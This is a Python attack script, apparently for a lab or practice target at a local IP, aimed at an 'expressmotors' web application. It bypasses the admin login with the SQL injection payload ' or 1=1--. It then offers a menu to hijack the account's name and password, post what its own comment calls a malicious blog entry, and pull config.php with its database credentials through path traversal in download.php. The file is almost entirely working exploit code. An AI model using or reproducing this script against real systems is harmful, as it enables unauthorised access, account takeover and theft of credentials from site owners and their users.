import mechanize
import urllib.request

def get_Credentials():
    url = "http://192.168.1.122/download.php?item=../config.php"
    response = urllib.request.urlopen(url)
    data = response.read()
    text = data.decode('utf-8')
    
    if text != "":

        f = open("config.php" , "w")
        f.write(text)
        f.close()

        print("\nconfig.php successfully retrieved! \n")
    
    else:
        print("\nError retrieving the file \n")

b = mechanize.Browser()

url = "http://192.168.1.122/account.php"

response = b.open(url)

b.select_form("login")

b.form["usermail"] = 'admin@expressmotors.net'
b.form["password"] = " ' or 1=1--'"

b.method = "POST"
response = b.submit()
print (response.geturl())

if response.geturl() == "http://192.168.1.122/account.php?login=success":
    print("\nLogin bypassed successfully!\n")
    
    
    print("1) Update Account Details")
    print("2) Post New Blog")
    print("3) Get Database Credentials")
    print("4) Exit")
    op = input("Choose an option: ")
    
    while op != "4":

        if op == "1":

        #update_details = input("Update Account Details?[y/n]: ")

            #if update_details == "y":

            response = b.open(url) # abrir de novo url #updated

            ## CHANGE THE USER PASSWORD AND NAME ##
            b.select_form(nr=1)

            b.form["name"] = input("New Account Name: ")
            b.form["password"] = input("New Password: ")

            b.method = "POST"

            response = b.submit()
            print(response.geturl())
            print("\nChanged account details successfully!\n")
        
        if op == "2":
        #blog_post = input("Post new Blog?[y/n]: ")

        #if blog_post == "y":
            ## MAKE A MALICIOUS POST TO THE BLOG ##

            b.select_form(nr=0)

            b.form["title"] = input("Title: ")
            b.form["content"] = input("Content: ")

            b.method = "POST"

            response = b.submit()
            print(response.geturl())
            print("\nPosted a new Blog successfully!\n")

        if op == "3":
            get_Credentials()

        if op == "4":
            print("Script Terminating")

        print("1) Update Account Details")
        print("2) Post New Blog")
        print("3) Get Database Credentials")
        print("4) Exit")
        op = input("Choose an option: ")

else: 
    print("Login bypass failed!")